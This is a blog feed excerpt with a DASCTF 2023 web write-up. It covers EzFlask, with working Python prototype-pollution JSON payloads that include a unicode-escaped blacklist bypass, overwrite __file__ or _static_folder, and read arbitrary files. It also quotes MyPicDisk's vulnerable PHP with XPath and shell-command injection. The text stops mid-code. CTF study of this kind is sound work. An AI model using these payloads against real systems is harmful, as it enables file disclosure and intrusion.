    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bfc3084065846ef3a57d7d0c25fc1a1dd0aa484ad8cccc2a82311f856c29a666"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Python反序列化" scheme="https://ke1nys.github.io/tags/show-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://ke1nys.github.io/posts/6893ad0d.html"/>
    <id>https://ke1nys.github.io/posts/6893ad0d.html</id>
    <published>2023-07-26T06:31:25.000Z</published>
    <updated>2023-07-29T08:13:42.299Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为比赛的时候刚好遇到这里不会&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143731499.png&quot; alt=&quot;image-20230726143731499&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Python原型链污染" scheme="https://ke1nys.github.io/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XXE-xpath注入</title>
    <link href="https://ke1nys.github.io/posts/9d9aaae5.html"/>
    <id>https://ke1nys.github.io/posts/9d9aaae5.html</id>
    <published>2023-07-26T06:30:56.000Z</published>
    <updated>2023-07-29T08:13:42.300Z</updated>
    
    <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143326525.png&quot; alt=&quot;image-202307</summary>
      
    
    
    
    
    <category term="XXE-xpath注入" scheme="https://ke1nys.github.io/tags/XXE-xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 &amp; 0X401-Web</title>
    <link href="https://ke1nys.github.io/posts/46437d33.html"/>
    <id>https://ke1nys.github.io/posts/46437d33.html</id>
    <published>2023-07-25T06:51:45.000Z</published>
    <updated>2023-07-29T08:13:42.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726100732339.png" alt="image-20230726100732339"></p><p>重点是这里  访问根目录的时候会读取我们的内置方法  <strong>(<code>__file__</code>)</strong></p><p>这里的话我们就可以通过污染这个<strong>内置属性</strong> 来指定我们想要读取的文件</p><p><img src="../images/image-20230726101131131.png" alt="image-20230726101131131"></p><p>就是在/<code>register</code>这个路由下  传入我们恶意构造的<code>json</code>语句</p><p>(<strong>这里有疑问的也可以去看看文章开头给的那篇文章)</strong></p><p>但是直接用文章给的<code>payload</code>是打不了的   因为有fuzz  但是因为这个<code>python</code>的<code>paylaod</code>和<code>ssti</code>差不多   所以可以使用编码来进行绕过</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>:&#123;<span class="string">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span>:<span class="string">&quot;/proc/self/cgroup&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230726101709961.png" alt="image-20230726101709961"></p><p>然后访问根目录  </p><p><img src="../images/image-20230726101758153.png" alt="image-20230726101758153"></p><p>这是个非预期解  </p><p><strong>其实看了文章开头给的文章的话  还可以污染另一个内置方法来直接读取文件</strong></p><p><img src="../images/image-20230726102006243.png" alt="image-20230726102006243"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__init\u005f_&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;app&quot;</span>:&#123;<span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span>&#125;&#125;&#125;,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是通过污染<code>_static_folder</code> 这个属性   <strong>来将当前目录设为根目录</strong></p><p>然后就可以直接进行目录穿越了</p><p><img src="../images/image-20230726102943214.png" alt="image-20230726102943214"></p><p>然后直接开始访问</p><p><img src="../images/image-20230726103038744.png" alt="image-20230726103038744"></p><p>都是可以直接访问的</p><p><img src="../images/image-20230726103154504.png" alt="image-20230726103154504"></p><p>这次比赛好几道题都可以这样来解  就是通过读取这个路径  来看docker的启动的sh文件内容  从而查到flag位置</p><p>就是存在两种可以污染的内置属性(<strong>可能还有其他的  但是我还不知道</strong>)</p><p>因为<code>console</code>开了  预期解是因为污染<code>__file__</code>   然后通过读取文件来算pin 然后再到控制台了读取文件</p><p><strong>(这里就不跟了)</strong></p><h2 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h2><p><img src="../images/image-20230726104245789.png" alt="image-20230726104245789"></p><p>万能密码登录  然后看到隐藏文件  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MyPicDisk&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">  <span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_file</span>(<span class="string">&#x27;/tmp/secret.xml&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$x_query</span>=<span class="string">&quot;/accounts/user[username=&#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$x_query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$result</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;登录失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span 